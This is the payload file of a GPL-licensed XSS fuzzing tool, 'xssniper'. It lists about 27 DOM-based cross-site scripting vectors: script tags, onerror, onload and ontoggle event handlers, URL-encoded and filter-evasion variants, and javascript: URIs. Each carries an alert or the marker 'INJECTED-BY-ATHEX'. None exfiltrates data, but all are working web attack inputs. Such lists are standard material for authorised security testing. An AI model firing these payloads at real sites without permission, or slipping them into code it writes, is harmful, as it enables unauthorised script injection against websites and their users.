#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
This file is part of the xssniper project, 

Copyright (c) 2026 | ATHEX

xssniper is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xssniper is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xssniper; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different XSS fuzzing vectors.
## If you have some new, please email me to [teamathex82@gmail.com]
## Happy Cross Hacking! ;)

DOMvectors = [
		{ 'payload':"""Y#<script>alert('INJECTED-BY-ATHEX')</script>""",
		  'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<%<!--'%><script>alert(INJECTED-BY-ATHEX);</script -->""",
          'browser':"""[Document Object Model Injection]"""},			
        { 'payload':"""Y#<script ^__^>alert(INJECTED-BY-ATHEX)</script ^__^""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script src="data:text/javascript,alert(INJECTED-BY-ATHEX)"></script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<script>+-+-1-+-+alert(INJECTED-BY-ATHEX)</script>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<script x> alert(INJECTED-BY-ATHEX) </script 1=2""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script>a=eval;b=alert;a(b(/ INJECTED-BY-ATHEX/.source));</script>'">''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script/y~~~>;alert(INJECTED-BY-ATHEX);</script/Y~~~>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%00“><script>alert(INJECTED-BY-ATHEX)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%22%3E%3Cscript%3Ealert(INJECTED-BY-ATHEX)%3B%3C%2Fscript%3E''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%3Cscript%3Ealert(INJECTED-BY-ATHEX)%3B%3C%2Fscript%3E''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#`"><%3Cscript>javascript:alert(INJECTED-BY-ATHEX)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%3Cscript>javascript:alert(INJECTED-BY-ATHEX)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<SCRIPT>a=/INJECTED-BY-ATHEX/alert(a.source)</SCRIPT>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<svg onload=INJECTED-BY-ATHEX>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<img src=x onerror=INJECTED-BY-ATHEX>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<details open ontoggle=INJECTED-BY-ATHEX>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<video><source onerror=INJECTED-BY-ATHEX>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<xss onfocus=INJECTED-BY-ATHEX autofocus tabindex=1>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<iframe srcdoc="&lt;svg onload=INJECTED-BY-ATHEX&gt;">""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<svg><animate onbegin=INJECTED-BY-ATHEX attributeName=x dur=1s>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#javascript:INJECTED-BY-ATHEX""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#x' onerror='alert(INJECTED-BY-ATHEX)""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#x" onerror="alert(INJECTED-BY-ATHEX)''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#'><img src=x onerror=alert(INJECTED-BY-ATHEX)>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#"><img src=x onerror=alert(INJECTED-BY-ATHEX)>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#javascript:alert(INJECTED-BY-ATHEX)""",
          'browser':"""[Document Object Model Injection]"""},
		]
